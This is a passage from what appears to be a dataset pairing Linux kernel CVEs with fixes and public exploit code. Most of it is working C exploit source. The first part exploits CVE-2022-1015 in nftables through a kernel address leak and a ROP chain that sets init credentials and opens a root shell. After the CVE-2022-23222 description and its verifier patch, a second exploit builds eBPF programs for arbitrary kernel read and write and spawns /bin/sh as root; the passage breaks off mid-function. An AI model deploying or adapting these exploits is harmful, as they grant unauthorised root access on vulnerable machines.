        // Create a rule that replaces the rule with handle INFOLEAK_RULE_HANDLE
        struct nftnl_rule* r = build_rule(table_name, aux_chain_name, NFPROTO_IPV4, NULL);
        nftnl_rule_set_u64(r, NFTNL_RULE_HANDLE, INFOLEAK_RULE_HANDLE);
        
        // The rule is going to compare 
        if (create_infoleak_rule(nl, r, mid, pos, NFPROTO_IPV4, seq, NLM_F_REPLACE)) {
            perror(""Could not replace infoleak rule"");
            exit(EXIT_FAILURE);
        }

        sendto(client_sock, msg, sizeof msg, 0, (struct sockaddr*)addr, sizeof *addr);

        struct sockaddr_in presumed_server_addr;
        socklen_t presumed_server_addr_len = sizeof presumed_server_addr;

        int nrecv = recvfrom(client_sock, result, sizeof result, 0, (struct sockaddr*)&presumed_server_addr, &presumed_server_addr_len);
        if (!nrecv) {
            puts(""[-] Remote socket closed..."");
            exit(EXIT_FAILURE);
        } else if (nrecv < 0) { 

            // In case of timeout, value is greater than `mid`
            low = mid + 1;
        } else {
            if (strcmp(result, ""MSG_OK"")) {
                puts(""[-] Something went wrong..."");
                exit(EXIT_FAILURE);
            }
            memset(result, 0, sizeof result);
            
            // But if we get a response, the packet arrived at the server and therefore the value is lower than or equal to mid

            high = mid;
        }
    }
}

uint32_t do_leak(struct mnl_socket* nl, struct sockaddr_in* addr, char* table_name, char* aux_chain_name, int* seq)
{

    #define CLIENT_HOST ""127.0.0.1""
    #define CLIENT_PORT 8888

    int client_sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

    struct sockaddr_in client_addr;
    inet_aton(CLIENT_HOST, &client_addr.sin_addr);
    client_addr.sin_port = htons(CLIENT_PORT);
    client_addr.sin_family = AF_INET;

    if (bind(client_sock, (struct sockaddr*)&client_addr, sizeof client_addr) < 0) {
        perror(""client bind"");
        return -1;
    }

    // 100ms receive timeout
    // can probably be lower
    struct timespec t = {.tv_sec =  0, .tv_nsec = 1000 * 200};
    setsockopt(client_sock, SOL_SOCKET, SO_RCVTIMEO, &t, sizeof t);
    
    uint8_t results[4] = {};

    for(int i = 1; i < 4; ++i) {
        results[i] = do_leak_byte(nl, client_sock, addr, table_name, aux_chain_name, i, seq);
        printf(""[+] Leaked byte %i: %.2hhx\n"", i, results[i]);
    }
    
    close(client_sock);
    return *(uint32_t*)results;

}

int simple_handler(int fd)
{
    char buf[4096] = {};
    
    struct sockaddr_in client_addr = {};
    socklen_t client_addr_size = sizeof client_addr;
    size_t conn_id = 0;

    for (;;) {

        int len = recvfrom(fd, buf, sizeof buf - 1, 0, (struct sockaddr*)&client_addr, &client_addr_size);

        if (len <= 0) {
            printf(""listener receive failed..\n"");
            perror("""");
            return -1;
        }
        
        printf(""Received message from [%s:%d] (udp) (0x%x bytes):\n"", inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port), len);
        hexdump(buf, len, 8);
    }

    close(fd);

    return 0;
}


int leak_handler(int fd)
{
    char buf[4096] = {};
    char send_back[] = ""MSG_OK"";
    struct sockaddr_in client_addr = {};
    socklen_t client_addr_size = sizeof client_addr;
    size_t conn_id = 0;

    for (;;) {

        int len = recvfrom(fd, buf, sizeof buf - 1, 0, (struct sockaddr*)&client_addr, &client_addr_size);

        if (len <= 0) {
            printf(""listener receive failed..\n"");
            perror("""");
            return -1;
        }
        
        sendto(fd, send_back, sizeof(send_back), 0, (struct sockaddr*)&client_addr, client_addr_size);
    }

    close(fd);

    return 0;
}

void* new_stack;

/* This is where we return after our rop chain */
extern void _after_rop();
void after_rop()
{

    system(""id"");
    system(""sh"");
    
}

static int install_rop_chain_rule(struct mnl_socket* nl, uint64_t kernel_base, char* chain, int* seq)
{
   
    // return address is at regs.data[0xca]
    struct vuln_expr_params v;
    
    if (calc_vuln_expr_params(&v, 0xca, 0x00, 0xff)) {
        puts(""[-] Cannot find suitable parameters for planting ROP chain."");
        return -1;
    }  
    
    struct nftnl_rule* r = build_rule(""exploit_table"", chain, NFPROTO_IPV4, NULL);
    //nftnl_rule_set_u64(r, NFTNL_RULE_HANDLE, INFOLEAK_RULE_HANDLE);
    rule_add_payload(r, NFT_PAYLOAD_INNER_HEADER, 8, v.max_len, v.value);
    
    
    int err = send_batch_request(
        nl,
        NFT_MSG_NEWRULE | (NFT_TYPE_RULE << 8),
        NLM_F_CREATE, NFPROTO_IPV4, (void**)&r, seq,
        NULL
    );
    
    if (err) {
        perror(""send_batch_request"");
        return err;
    }
    
    return v.max_len;

}

void trigger_rop(struct mnl_socket* nl, uint64_t kernel_base, struct sockaddr_in* magic_addr, int rop_length)
{

    // Structures in .data
    #define INIT_NSPROXY_OFF 0x1867360
    #define INIT_PID_NS_OFF 0x1866fe0
    #define INIT_CRED_OFF 0x18675a0

    // Routines in .text
    #define SWITCH_TASK_NAMESPACES_OFF 0xd1040
    #define COMMIT_CREDS_OFF 0xd2430
    #define FIND_TASK_BY_VPID_OFF 0x0c8c80
    #define BPF_GET_CURRENT_TASK_OFF 0x1ebde0
    #define __DO_SOFTIRQ_OFF 0x1000000
    
    // Gadgets
    #define MOV_RDI_RAX_OFF 0xc032fb // constraint: rcx==0
    #define POP_RDI_OFF 0x92610
    #define POP_RSI_OFF 0x676d2
    #define POP_RCX_OFF 0x139a3
    #define POP_RBP_OFF 0x6ffa8d
    #define XOR_ECX_ECX_OFF 0x7110bf
    #define MOV_R13_RCX_POP_RBP_OFF 0xaf089b
    #define POP_R11_R12_RBP_OFF 0x054645
    #define CLI_OFF 0x4df88b
    #define STI_OFF 0xc061c0
    #define MOV_RCX_RAX_OFF 0x2faad4
    #define SWAPGS_SYSRETQ_OFF 0xe000fb
    // Misc.
    #define OLD_TASK_FLAGS_OFF 0x1a554a // 0x40010000

    uint64_t *packet = calloc(1, rop_length + 8);

    packet[0] = 0;
    uint64_t* rop = &packet[1];


    // 0xffffffff819d5cda <__netif_receive_skb_one_core+122> ret
    
    int i = 0;
    #define _rop(x) do { if ((i+1)*8 > rop_length) { puts(""ROP TOO LONG""); exit(EXIT_FAILURE);} rop[i++] = (x); } while (0)

    // clear interrupts
    _rop(kernel_base + CLI_OFF);
    
    // make rbp-0x58 point to 0x40010000
    _rop(kernel_base + POP_RBP_OFF);
    _rop(kernel_base + OLD_TASK_FLAGS_OFF + 0x58);
    
    /* Cleanly exit softirq and return to syscall context */
    _rop(kernel_base + __DO_SOFTIRQ_OFF + 418);
    
    // stack frame was 0x60 bytes
    for(int j = 0; j < 12; ++j) _rop(0);

    /* We're already on 128 bytes here */

    // switch_task_namespaces(current, &init_nsproxy)
    _rop(kernel_base + BPF_GET_CURRENT_TASK_OFF);
    _rop(kernel_base + MOV_RDI_RAX_OFF); // rcx happens to aleady be 0
    _rop(kernel_base + POP_RSI_OFF);
    _rop(kernel_base + INIT_NSPROXY_OFF);
    _rop(kernel_base + SWITCH_TASK_NAMESPACES_OFF);

    // commit_cred(&init_cred)
    _rop(kernel_base + POP_RDI_OFF);
    _rop(kernel_base + INIT_CRED_OFF);
    _rop(kernel_base + COMMIT_CREDS_OFF);

    // pass control to system call stack
    // this is offset +0xc0 from our rop chain
    // target is at   +0x168
    _rop(kernel_base + 0x28b2e4); // add rsp, 0x90; pop rbx; pop rbp; ret

    int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    puts(""Triggering payload.."");
    sendto(s, packet, rop_length + 8, 0, (struct sockaddr*)magic_addr, sizeof *magic_addr);
}

int main(int argc, char** argv, char** envp)
{

    if (argc < 2) {
        puts(""[+] Dropping into network namespace"");
        
        // We're too lazy to perform uid mapping and such.
        char* new_argv[] = {
            ""/usr/bin/unshare"",
            ""-Urn"",
            argv[0],
            ""EXPLOIT"",
            NULL
        };

        execve(new_argv[0], new_argv, envp);
        puts(""Couldn't start unshare wrapper.."");
        puts(""Recompile the exploit with an appropriate unshare path."");
        exit(EXIT_FAILURE);
    }
    if (strcmp(""EXPLOIT"", argv[1])) {
        puts(""[-] Something went wrong..."");
        exit(EXIT_FAILURE);
    }

    // I'm too lazy to talk to NETLINK_ROUTE..
    // Deal with it!
    system(""ip link set dev lo up"");

    struct mnl_socket* nl = mnl_socket_open(NETLINK_NETFILTER);

    if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0) {
        perror(""[-] mnl_socket_bind"");
        puts(""[-] Are you sure you have CAP_NET_ADMIN?.."");
        exit(EXIT_FAILURE);
    }
    int seq = time(NULL);
    int err;

    char *table_name = ""exploit_table"", 
         *base_chain_name = ""base_chain"",
         *aux_chain_name = ""aux_chain"";

    setup_nftables(nl, table_name, base_chain_name, &seq);
    
    if (create_chain(nl, table_name, aux_chain_name, NFPROTO_IPV4, NULL, &seq, NULL)) {
            perror(""Failed creating auxiliary chain"");
            exit(EXIT_FAILURE);
    }
    printf(""[+] Created auxiliary chain %s\n"", aux_chain_name);

    if (create_base_chain_rule(nl, table_name, base_chain_name, NFPROTO_IPV4, NULL, &seq)) {
        perror(""Failed creating base chain rule"");
        exit(EXIT_FAILURE);
    }

    puts(""[+] Created base chain rule"");
    
    // we need to make a rule first in order to replace it
    // in our leaky rule creation. it's a bit of a hack but it works
    // We can also use it to determine whether the system is vulnerable
    // before actually exploiting.
    
    struct vuln_expr_params v;
    
    // offset 0xca and len 0xff is OOB
    if (calc_vuln_expr_params(&v, 0xca, 0x00, 0xff)) {
        puts(""[-] Something went horribly wrong..."");
        exit(EXIT_FAILURE);
    }  
    
    struct nftnl_rule* aux_rule = build_rule(table_name, aux_chain_name, NFPROTO_IPV4, NULL);
    rule_add_payload(aux_rule, NFT_PAYLOAD_INNER_HEADER, 8, v.max_len, v.value);

    err = send_batch_request(
        nl,
        NFT_MSG_NEWRULE | (NFT_TYPE_RULE << 8),
        NLM_F_CREATE, NFPROTO_IPV4, (void**)&aux_rule, &seq,
        NULL
    );

    if (err) {
        puts(CLR_RED ""[+] TARGET IS NOT VULNERABLE to CVE-2022-1015!"" CLR_RESET);
        exit(EXIT_FAILURE);
    }

    puts(""[+] Succesfully created rule with OOB nft_payload!"");
    puts(CLR_GRN ""[+] TARGET IS VULNERABLE to CVE-2022-1015!"" CLR_RESET);
    puts(""[+] Type 'y' to try exploiting the target."");
    puts(CLR_RED ""!!!BEWARE: THIS IS LIKELY TO CAUSE A KERNEL PANIC!!!"" CLR_RESET);
    
    char a[4] = {};
    read(0, a, 1);

    if (a[0] != 'y') {
        puts(""Bye!"");
        exit(EXIT_SUCCESS);   
    }

    #define SERVER_HOST ""127.0.0.1""
    #define SERVER_PORT 9999

    int pid = setup_listener(SERVER_HOST, SERVER_PORT, leak_handler);
    
    struct sockaddr_in server;
    inet_aton(SERVER_HOST, &server.sin_addr);
    server.sin_port = htons(SERVER_PORT);
    server.sin_family = AF_INET;

    #define LEAK_BASE_OFFSET 0x9ac3ec
    uint32_t leak = do_leak(nl, &server, table_name, aux_chain_name, &seq);
    // first byte might fail due to buggy carry implementation with shift_amt = 0
    // so we just set it. The LSB will always remain constant.

    uint64_t kernel_addr = 0xffffffff00000000 + leak + (LEAK_BASE_OFFSET & 0xff);
    uint64_t kernel_base = kernel_addr - LEAK_BASE_OFFSET;
    
    
    // If the kernel base isn't aligned we should probably not continue.
    if((kernel_base & 0xfffff) != 0) {
        puts(""[-] Leak failed."");
        puts(""[-] Try changing offsets / lengths / chain types."");
        puts(""[-] If all leaked bytes were ff, this is probably because of corrupted loopback state.. RIP"");
        exit(EXIT_FAILURE);
    }

    printf(""[+] Kernel base @ 0x%.16lx\n"", kernel_base);
    stop_listener(pid);
    struct unft_base_chain_param bp;
    bp.hook_num = NF_INET_LOCAL_IN;
    bp.prio = 10;

    if (create_chain(nl, table_name, ""base_chain_2"", NFPROTO_IPV4, &bp, &seq, NULL)) {
        perror(""Failed adding second base chain"");
        exit(EXIT_FAILURE);
    }

    err = install_rop_chain_rule(nl, kernel_base, ""base_chain_2"", &seq);
    if (err < 0) {
        perror(""[-] Could not install ROP chain"");
        exit(EXIT_FAILURE);
    };

    new_stack = mmap(NULL, 0x4000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0) + 0x3ff0;
    trigger_rop(nl, kernel_base, &server, err);
    after_rop();
}

",https://github.com/pqlx/CVE-2022-1015/tree/master,,,
CVE-2022-23222,https://www.opencve.io/cve/CVE-2022-23222,kernel/bpf/verifier.c in the Linux kernel through 5.15.14 allows local users to gain privileges because of the availability of pointer arithmetic via certain *_OR_NULL pointer types.,"bpf: Fix out of bounds access for ringbuf helpers
Both bpf_ringbuf_submit() and bpf_ringbuf_discard() have ARG_PTR_TO_ALLOC_MEM
in their bpf_func_proto definition as their first argument. They both expect
the result from a prior bpf_ringbuf_reserve() call which has a return type of
RET_PTR_TO_ALLOC_MEM_OR_NULL.

Meaning, after a NULL check in the code, the verifier will promote the register
type in the non-NULL branch to a PTR_TO_MEM and in the NULL branch to a known
zero scalar. Generally, pointer arithmetic on PTR_TO_MEM is allowed, so the
latter could have an offset.

The ARG_PTR_TO_ALLOC_MEM expects a PTR_TO_MEM register type. However, the non-
zero result from bpf_ringbuf_reserve() must be fed into either bpf_ringbuf_submit()
or bpf_ringbuf_discard() but with the original offset given it will then read
out the struct bpf_ringbuf_hdr mapping.

The verifier missed to enforce a zero offset, so that out of bounds access
can be triggered which could be used to escalate privileges if unprivileged
BPF was enabled (disabled by default in kernel).

Fixes: 457f44363a88 (""bpf: Implement BPF ring buffer and verifier support for it"")
Reported-by: <tr3e.wang@gmail.com> (SecCoder Security Lab)
Signed-off-by: Daniel Borkmann <daniel@iogearbox.net>
Acked-by: John Fastabend <john.fastabend@gmail.com>
Acked-by: Alexei Starovoitov <ast@kernel.org>
Diffstat
-rw-r--r--	kernel/bpf/verifier.c	6	
1 files changed, 6 insertions, 0 deletions
diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c
index e0b3f4d683eb7f..c72c57a6684ff0 100644
--- a/kernel/bpf/verifier.c
+++ b/kernel/bpf/verifier.c
@@ -5318,9 +5318,15 @@ static int check_func_arg(struct bpf_verifier_env *env, u32 arg,
 	case PTR_TO_BUF:
 	case PTR_TO_BUF | MEM_RDONLY:
 	case PTR_TO_STACK:
+		/* Some of the argument types nevertheless require a
+		 * zero register offset.
+		 */
+		if (arg_type == ARG_PTR_TO_ALLOC_MEM)
+			goto force_off_check;
 		break;
 	/* All the rest must be rejected: */
 	default:
+force_off_check:
 		err = __check_ptr_off_reg(env, reg, regno,
 					  type == PTR_TO_BTF_ID);
 		if (err < 0)",https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=64620e0a1e712a778095bd35cbb277dc2259281f,"#include <signal.h>
#include <sys/prctl.h>
#include <sys/wait.h>

#include ""bpf.h""
#include ""config.h""
#include ""debug.h""
#include ""helper.h""

typedef struct {
    int comm_fd;
    int ringbuf_fd;

    int arbitrary_read_prog;
    int arbitrary_write_prog;

    pid_t processes[PROC_NUM];

    kaddr_t array_map;
    kaddr_t cred;

    union {
        u8 bytes[PAGE_SIZE*8];
        u16 words[0];
        u32 dwords[0];
        u64 qwords[0];
        kaddr_t ptrs[0];
    };
} context_t;

typedef struct {
    const char* name;
    int (*func)(context_t *ctx);
    int ignore_error;
} phase_t;

int create_bpf_maps(context_t *ctx)
{
    int ret = 0;

    ret = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(u32), PAGE_SIZE, 1);
    if (ret < 0) {
        WARNF(""Failed to create comm map: %d (%s)"", ret, strerror(-ret));
        return ret;
    }
    ctx->comm_fd = ret;

    if ((ret = bpf_create_map(BPF_MAP_TYPE_RINGBUF, 0, 0, PAGE_SIZE)) < 0) {
        WARNF(""Could not create ringbuf map: %d (%s)"", ret, strerror(-ret));
        return ret;
    }
    ctx->ringbuf_fd = ret;

    return 0;
}

int do_leak(context_t *ctx)
{
    int ret = -1;
    struct bpf_insn insn[] = {
        // r9 = r1
        BPF_MOV64_REG(BPF_REG_9, BPF_REG_1),

        // r0 = bpf_lookup_elem(ctx->comm_fd, 0)
        BPF_LD_MAP_FD(BPF_REG_1, ctx->comm_fd),
        BPF_ST_MEM(BPF_DW, BPF_REG_10, -8, 0),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),

        // if (r0 == NULL) exit(1)
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 2),
        BPF_MOV64_IMM(BPF_REG_0, 1),
        BPF_EXIT_INSN(),

        // r8 = r0
        BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),

        // r0 = bpf_ringbuf_reserve(ctx->ringbuf_fd, PAGE_SIZE, 0)
        BPF_LD_MAP_FD(BPF_REG_1, ctx->ringbuf_fd),
        BPF_MOV64_IMM(BPF_REG_2, PAGE_SIZE),
        BPF_MOV64_IMM(BPF_REG_3, 0x00),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_reserve),

        BPF_MOV64_REG(BPF_REG_1, BPF_REG_0),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, 1),

        // if (r0 != NULL) { ringbuf_discard(r0, 1); exit(2); }
        BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 5),
        BPF_MOV64_REG(BPF_REG_1, BPF_REG_0),
        BPF_MOV64_IMM(BPF_REG_2, 1),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_discard),
        BPF_MOV64_IMM(BPF_REG_0, 2),
        BPF_EXIT_INSN(),

        // verifier believe r0 = 0 and r1 = 0. However, r0 = 0 and  r1 = 1 on runtime.

        // r7 = r1 + 8
        BPF_MOV64_REG(BPF_REG_7, BPF_REG_1),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 8),

        // verifier believe r7 = 8, but r7 = 9 actually.

        // store the array pointer (0xFFFF..........10 + 0xE0)
        BPF_MOV64_REG(BPF_REG_6, BPF_REG_8),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_6, 0xE0),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_6, -8),

        // partial overwrite array pointer on stack

        // r0 = bpf_skb_load_bytes_relative(r9, 0, r8, r7, 0)
        BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),
        BPF_MOV64_IMM(BPF_REG_2, 0),
        BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -16),
        BPF_MOV64_REG(BPF_REG_4, BPF_REG_7),
        BPF_MOV64_IMM(BPF_REG_5, 1),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_skb_load_bytes_relative),

        // r6 = 0xFFFF..........00 (off = 0xE0)
        BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_10, -8),
        BPF_ALU64_IMM(BPF_SUB, BPF_REG_6, 0xE0),

        
        // map_update_elem(ctx->comm_fd, 0, r6, 0)
        BPF_LD_MAP_FD(BPF_REG_1, ctx->comm_fd),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_8),
        BPF_MOV64_REG(BPF_REG_3, BPF_REG_6),
        BPF_MOV64_IMM(BPF_REG_4, 0),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_update_elem),

        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN()
    };

    int prog = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, insn, sizeof(insn) / sizeof(insn[0]), """");
    if (prog < 0) {
        WARNF(""Could not load program(do_leak):\n %s"", bpf_log_buf);
        goto abort;
    }

    int err = bpf_prog_skb_run(prog, ctx->bytes, 8);

    if (err != 0) {
        WARNF(""Could not run program(do_leak): %d (%s)"", err, strerror(err));
        goto abort;
    }

    int key = 0;
    err = bpf_lookup_elem(ctx->comm_fd, &key, ctx->bytes);
    if (err != 0) {
        WARNF(""Could not lookup comm map: %d (%s)"", err, strerror(err));
        goto abort;
    }
    
    u64 array_map = (u64)ctx->ptrs[20] & (~0xFFL);
    if ((array_map&0xFFFFF00000000000) != 0xFFFF800000000000) {
        WARNF(""Could not leak array map: got %p"", (kaddr_t)array_map);
        goto abort;
    }

    ctx->array_map = (kaddr_t)array_map;
    DEBUGF(""array_map @ %p"", ctx->array_map);

    ret = 0;

abort:
    if (prog > 0) close(prog);
    return ret;
}

int prepare_arbitrary_rw(context_t *ctx)
{
    int arbitrary_read_prog = 0;
    int arbitrary_write_prog = 0;

    struct bpf_insn arbitrary_read[] = {
        // r9 = r1
        BPF_MOV64_REG(BPF_REG_9, BPF_REG_1),

        // r0 = bpf_lookup_elem(ctx->comm_fd, 0)
        BPF_LD_MAP_FD(BPF_REG_1, ctx->comm_fd),
        BPF_ST_MEM(BPF_DW, BPF_REG_10, -8, 0),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),

        // if (r0 == NULL) exit(1)
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 2),
        BPF_MOV64_IMM(BPF_REG_0, 1),
        BPF_EXIT_INSN(),

        // r8 = r0
        BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),

        // r0 = bpf_ringbuf_reserve(ctx->ringbuf_fd, PAGE_SIZE, 0)
        BPF_LD_MAP_FD(BPF_REG_1, ctx->ringbuf_fd),
        BPF_MOV64_IMM(BPF_REG_2, PAGE_SIZE),
        BPF_MOV64_IMM(BPF_REG_3, 0x00),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_reserve),

        BPF_MOV64_REG(BPF_REG_1, BPF_REG_0),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, 1),

        // if (r0 != NULL) { ringbuf_discard(r0, 1); exit(2); }
        BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 5),
        BPF_MOV64_REG(BPF_REG_1, BPF_REG_0),
        BPF_MOV64_IMM(BPF_REG_2, 1),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_discard),
        BPF_MOV64_IMM(BPF_REG_0, 2),
        BPF_EXIT_INSN(),

        // verifier believe r0 = 0 and r1 = 0. However, r0 = 0 and  r1 = 1 on runtime.

        // r7 = (r1 + 1) * 8
        BPF_MOV64_REG(BPF_REG_7, BPF_REG_1),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 1),
        BPF_ALU64_IMM(BPF_MUL, BPF_REG_7, 8),

        // verifier believe r7 = 8, but r7 = 16 actually.

        // store the array pointer
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_8, -8),

        // overwrite array pointer on stack

        // r0 = bpf_skb_load_bytes_relative(r9, 0, r8, r7, 0)
        BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),
        BPF_MOV64_IMM(BPF_REG_2, 0),
        BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -16),
        BPF_MOV64_REG(BPF_REG_4, BPF_REG_7),
        BPF_MOV64_IMM(BPF_REG_5, 1),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_skb_load_bytes_relative),

        // fetch our arbitrary address pointer
        BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_10, -8),
        
        BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_6, 0),
        BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_0, 0),

        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN()
    };

    arbitrary_read_prog = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, arbitrary_read, sizeof(arbitrary_read) / sizeof(arbitrary_read[0]), """");
    if (arbitrary_read_prog < 0) {
        WARNF(""Could not load program(arbitrary_write):\n %s"", bpf_log_buf);
        goto abort;
    }

    struct bpf_insn arbitrary_write[] = {
        // r9 = r1
        BPF_MOV64_REG(BPF_REG_9, BPF_REG_1),

        // r0 = bpf_lookup_elem(ctx->comm_fd, 0)
        BPF_LD_MAP_FD(BPF_REG_1, ctx->comm_fd),
        BPF_ST_MEM(BPF_DW, BPF_REG_10, -8, 0),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),

        // if (r0 == NULL) exit(1)
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 2),
        BPF_MOV64_IMM(BPF_REG_0, 1),
        BPF_EXIT_INSN(),

        // r8 = r0
        BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),

        // r0 = bpf_ringbuf_reserve(ctx->ringbuf_fd, PAGE_SIZE, 0)
        BPF_LD_MAP_FD(BPF_REG_1, ctx->ringbuf_fd),
        BPF_MOV64_IMM(BPF_REG_2, PAGE_SIZE),
        BPF_MOV64_IMM(BPF_REG_3, 0x00),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_reserve),

        BPF_MOV64_REG(BPF_REG_1, BPF_REG_0),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, 1),

        // if (r0 != NULL) { ringbuf_discard(r0, 1); exit(2); }
        BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 5),
        BPF_MOV64_REG(BPF_REG_1, BPF_REG_0),
        BPF_MOV64_IMM(BPF_REG_2, 1),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_discard),
        BPF_MOV64_IMM(BPF_REG_0, 2),
        BPF_EXIT_INSN(),

        // verifier believe r0 = 0 and r1 = 0. However, r0 = 0 and  r1 = 1 on runtime.

        // r7 = (r1 + 1) * 8
        BPF_MOV64_REG(BPF_REG_7, BPF_REG_1),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 1),
        BPF_ALU64_IMM(BPF_MUL, BPF_REG_7, 8),

        // verifier believe r7 = 8, but r7 = 16 actually.

        // store the array pointer
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_8, -8),

        // overwrite array pointer on stack

        // r0 = bpf_skb_load_bytes_relative(r9, 0, r8, r7, 0)
        BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),
        BPF_MOV64_IMM(BPF_REG_2, 0),
        BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -16),
        BPF_MOV64_REG(BPF_REG_4, BPF_REG_7),
        BPF_MOV64_IMM(BPF_REG_5, 1),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_skb_load_bytes_relative),

        // fetch our arbitrary address pointer
        BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_10, -8),
        
        BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_8, 0),
        BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_8, 8),

        // if (r0 == 0) { *(u64*)r6 = r1 }
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 2),
        BPF_STX_MEM(BPF_DW, BPF_REG_6, BPF_REG_1, 0),
        BPF_JMP_IMM(BPF_JA, 0, 0, 1),
        // else { *(u32*)r6 = r1 }
        BPF_STX_MEM(BPF_W, BPF_REG_6, BPF_REG_1, 0),

        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN()
    };

    arbitrary_write_prog = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, arbitrary_write, sizeof(arbitrary_write) / sizeof(arbitrary_read[0]), """");
    if (arbitrary_write_prog < 0) {
        WARNF(""Could not load program(arbitrary_write):\n %s"", bpf_log_buf);
        goto abort;
    }

    ctx->arbitrary_read_prog = arbitrary_read_prog;
    ctx->arbitrary_write_prog = arbitrary_write_prog;
    return 0;

abort:
    if (arbitrary_read_prog > 0) close(arbitrary_read_prog);
    if (arbitrary_write_prog > 0) close(arbitrary_write_prog);
    return -1;
}

int spawn_processes(context_t *ctx)
{
    for (int i = 0; i < PROC_NUM; i++)
    {
        pid_t child = fork();
        if (child == 0) {
            if (prctl(PR_SET_NAME, __ID__, 0, 0, 0) != 0) {
                WARNF(""Could not set name"");
            }
            uid_t old = getuid();
            kill(getpid(), SIGSTOP);
            uid_t uid = getuid();
            if (uid == 0 && old != uid) {
                OKF(""Enjoy root!"");
                system(""/bin/sh"");
            }
            exit(uid);
        }
        if (child < 0) {
            return child;
        }
        ctx->processes[i] = child;
    }

    return 0;
}

int arbitrary_read(context_t *ctx, kaddr_t addr, u64 *val, int bpf_size)
{
    ctx->ptrs[0] = addr;
    ctx->ptrs[1] = addr;

    int err = bpf_prog_skb_run(ctx->arbitrary_read_prog, ctx->ptrs, 0x100);
    if (err != 0) {
        WARNF(""Could not run program(arbitrary_read): %d (%s)"", err, strerror(err));
        return -1;
    }

    int key = 0;
    err = bpf_lookup_elem(ctx->comm_fd, &key, ctx->bytes);
    if (err != 0) {
        WARNF(""Could not lookup comm map: %d (%s)"", err, strerror(err));
        return -1;
    }
    
    *val = ctx->qwords[0];
    return 0;
}

int arbitrary_write(context_t *ctx, kaddr_t addr, u64 val, int bpf_size)
{
    int err = 0;
